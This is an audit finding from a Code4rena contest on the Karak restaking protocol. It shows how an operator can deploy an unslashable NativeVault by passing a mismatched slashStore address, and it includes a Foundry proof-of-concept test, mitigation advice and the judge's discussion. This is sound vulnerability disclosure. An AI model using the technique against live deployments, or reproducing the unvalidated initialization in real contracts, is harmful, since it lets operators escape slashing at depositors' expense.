---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/restaking
  - sector/staking
protocol: "[[Karak]]"
auditors:
  - "[[1]]"
report: "https://code4rena.com/reports/2024-07-karak"
genome:
  - "[[missing-owner-check]]"
  - "[[permanent]]"
  - "[[reward-accounting]]"
---
# [H-02] The operator can create a `NativeVault` that can be silently unslashable

- id: 41066
- impact: HIGH
- protocol: [[Karak]]
- reporter: 1 (Code4rena)
- source: https://code4rena.com/reports/2024-07-karak

## Summary


This bug report describes a problem with the `NativeVault` function in the `Core` contract. When an operator creates a `NativeVault`, they can set the `slashStore` address to be different from the `assetSlashingHandlers` address for ETH. This causes the `slashAssets()` function to always revert, making the vault unslashable. This is a high severity issue as it threatens the integrity of operators and the protocol's core functionality. The recommended mitigation is to add a verified `slashingHandler` for ETH on the `Core` contract and verify that the operator is using the correct `slashStore` address. However, this issue is still unmitigated and being worked on by the Karak team.

## Details


An operator can create a `NativeVault` which always reverts when `slashAssets()` is called and make the vault unslashable.

### Proof of Concept

When an operator want to create a `NativeVault`, he call the `deployVaults()` function on the `Core` contract with a custom config struct to give informations for the deployment. The `extraData` params is used to give the `manager`, `slahsStore` and `nodeImplementation` addresses on the `initialize()` function of the `NativeVault`.

When an asset is allowed on the protocol, a `slashingHandler` address is associated with the asset address on the `assetSlashingHandlers` mapping.

`NativeVault` is used to make native restaking with the ETH of Beacon Chain validators of users. When a slashing is executed, the address of `assetSlashingHandlers` mapping is inserted as a params in [the call](https://github.com/code-423n4/2024-07-karak/blob/f5e52fdcb4c20c4318d532a9f08f7876e9afb321/src/entities/SlasherLib.sol#L134-L138) `slashAssets()` :

```solidity
    for (uint256 i = 0; i < queuedSlashing.vaults.length; i++) {
        IKarakBaseVault(queuedSlashing.vaults[i]).slashAssets(
            queuedSlashing.earmarkedStakes[i],
            self.assetSlashingHandlers[IKarakBaseVault(queuedSlashing.vaults[i]).asset()]
        );
    }
```

Then the function make this [verification](https://github.com/code-423n4/2024-07-karak/blob/f5e52fdcb4c20c4318d532a9f08f7876e9afb321/src/NativeVault.sol#L308) with the input address of `slashingHandler`:

```solidity
    if (slashingHandler != self.slashStore) revert NotSlashStore();
```

If the operator, during the initialization, insert a `slashStore` address which is different from the `assetSlashingHandlers` address for ETH, the call on the `NativeVault` will always revert and make the vault slash impossible.

**Proof of Concept**

You can add this PoC to the `./test/nativeRestaking/nativeVault.t.sol`:

```solidity

    function test_createUnslashableVault() public {
        //Setup
        vm.warp(1718549030);
        NativeVault unslashableVault;
        address badSlashStore = address(666);
        DSSContract dss = new DSSContract();

        vm.startPrank(address(dss));
        core.registerDSS(100000000000000000000);
        vm.stopPrank();       
        // Setup NativeNode implementation
        address nativeNodeImpl = address(new NativeNode());

        // Deploy Vaults
        VaultLib.Config[] memory vaultConfigs = new VaultLib.Config[](1);
        vaultConfigs[0] = VaultLib.Config({
            asset: Constants.DEAD_BEEF,
            decimals: 18,
            operator: operator,
            name: "NativeTestVault",
            symbol: "NTV",
            extraData: abi.encode(address(manager), badSlashStore, address(nativeNodeImpl))
        });

        vm.startPrank(operator);
        IDSS dssInterface = IDSS(address(dss));
        core.registerOperatorToDSS(dssInterface, bytes(""));
        IKarakBaseVault[] memory vaults = core.deployVaults(vaultConfigs, address(0));
        unslashableVault = NativeVault(address(vaults[0]));
        
        //Register vault staked for dss
        Operator.StakeUpdateRequest memory stakeRequest = Operator.StakeUpdateRequest({
            vault: address(unslashableVault),
            dss: dssInterface,
            toStake: true
        });
        Operator.QueuedStakeUpdate memory queuedStake = core.requestUpdateVaultStakeInDSS(stakeRequest);
        vm.warp(1718549030 + 10 days);
        core.finalizeUpdateVaultStakeInDSS(queuedStake);
        vm.stopPrank();
        
        vm.startPrank(address(dss));
        //Slash request 
        uint96[] memory slashPercentagesWad = new uint96[](1);
        slashPercentagesWad[0] = 10000000000000000000;
        address[] memory operatorVaults = new address[](1);
        operatorVaults[0] = address(unslashableVault);
        
        SlasherLib.SlashRequest memory slashingReq = SlasherLib.SlashRequest({
            operator: operator,
            slashPercentagesWad: slashPercentagesWad,
            vaults: operatorVaults
        });

        //Request and execute the slashing but revert
        SlasherLib.QueuedSlashing memory queuedSlashing = core.requestSlashing(slashingReq);
        vm.warp(1718549030 + 14 days);
        core.finalizeSlashing(queuedSlashing);
        
        vm.stopPrank();
    }
```

Add also this contract for the dss on the same file :

```solidity
    contract DSSContract {
        uint256 variable;
        constructor() {
            variable = 1;
        }
        function returnVariable() external view returns(uint256 _variable) {
            _variable = variable;
        }
    }
```

And execute the command: `forge test --mt test_createUnslashableVault -vvvvv`.

### Recommended Mitigation Steps

You can add a verified `slashingHandler` for ETH on the `Core` contract and verify the operator use the correct `slashStore` params on the `initialize()` function in the `NativeVault`, or on the `deployVaults()` for `NativeVault`.

**[dewpe (Karak) disputed and commented](https://github.com/code-423n4/2024-07-karak-findings/issues/55#issuecomment-2267609461):**
 > We think it should be re-classified to `med` because it's ultimately the DSS' responsibility to figure out which operators and vaults to take in via the `registrationHook.selector`.

**[MiloTruck (judge) commented](https://github.com/code-423n4/2024-07-karak-findings/issues/55#issuecomment-2282714847):**
 > The crux of this issue and its duplicates is that for native vaults, `vaultConfig.extraData` has no input validation in when calling `deployVaults()`. This means the operator can set `manager`, `slashStore` and `nodeImplementation` to anything.
> 
> This issue has demonstrated how an operator can create an unslashable vault by creating it with `slashStore` as a different address than the whitelisted slashing handler for ETH. Slashing is core functionality of the protocol and being unable to do so would threaten the integrity of operators (eg. operator can act malicious, causing loss of funds, at no risk). 
> 
> https://github.com/code-423n4/2024-07-karak-findings/issues/85 describes how the setting the manager will allow the operator to call restricted functions.
> 
> As such, I believe high severity is appropriate.
> 
> > We think it should be re-classified to med because it's ultimately the DSS' responsibility to figure out which operators and vaults to take in via the `registrationHook.selector`.
> 
> Given that the DSS implementation isn't in-scope and wardens did not know what `registrationHook` could/couldn't do during the audit, I don't think it is fair to downgrade the issue based on this.

**[Karak mitigated](https://github.com/code-423n4/2024-09-karak-mitigation?tab=readme-ov-file#scope):**
> This mitigation removes the SlashStore altogether and the NativeVault itself burns the slashed ETH.

**Status:** Unmitigated. Full details in reports from [sl1](https://github.com/code-423n4/2024-09-karak-mitigation-findings/issues/12) and [0xCiphky](https://github.com/code-423n4/2024-09-karak-mitigation-findings/issues/8), and also included in the [Mitigation Review](#mitigation-review) section below.

***
